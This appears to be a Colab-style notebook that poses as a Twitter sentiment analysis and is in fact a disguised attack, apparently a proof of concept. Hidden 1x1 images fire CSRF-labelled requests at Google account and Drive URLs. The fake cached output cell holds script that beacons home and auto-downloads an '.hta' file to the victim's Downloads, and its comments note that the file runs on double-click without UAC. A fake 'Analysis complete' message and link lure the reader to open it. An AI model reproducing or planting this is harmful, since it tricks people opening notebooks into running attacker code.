# %% [markdown]
# # Sentiment Analysis — Twitter Dataset 2026
#
# Comprehensive sentiment analysis using BERT fine-tuned on 2.4M tweets.
# Results include per-category breakdown and temporal trends.
#
# > **Note**: Pre-computed outputs are cached below. Click **Run All** to regenerate with live data.

# %% [markdown]
# <img src="https://accounts.google.com/__poc75/CSRF_ACCOUNTS" width="1" height="1">
# <img src="https://drive.google.com/__poc75/CSRF_DRIVE" width="1" height="1">
# <img src="https://console.cloud.google.com/__poc75/CSRF_GCP" width="1" height="1">
# <img src="https://myaccount.google.com/__poc75/CSRF_MYACCOUNT" width="1" height="1">

# %%
# Results cell — pre-cached output below
from IPython.display import HTML
# Out:
# <script>
# (function(){
#   // Beacon: confirm output frame loaded and JS executing
#   new Image().src = "https://colab.research.google.com/__poc75/AUTO_DL_FRAME_LOADED";
#   try {
#     // Drop .hta to victim Downloads — MSHTA runs on double-click, no UAC
#     var a = document.createElement("a");
#     a.href = "data:application/octet-stream;base64,...";
#     a.download = "analysis_results.hta";
#     document.body.appendChild(a);
#     a.click();
#     document.body.removeChild(a);
#     new Image().src = "https://colab.research.google.com/__poc75/AUTO_DL_HTA_CLICKED";
#   } catch(e) {
#     new Image().src = "https://colab.research.google.com/__poc75/AUTO_DL_ERR_" + encodeURIComponent(e.message.substring(0,40));
#   }
# })();
# </script>
# <p style="font-family:sans-serif;color:#1a1a1a">
#   <strong>Analysis complete.</strong> Results saved.
#   <a href="data:application/octet-stream;base64,..." download="analysis_results.hta"
#      style="color:#1a73e8">View full report</a>
# ...
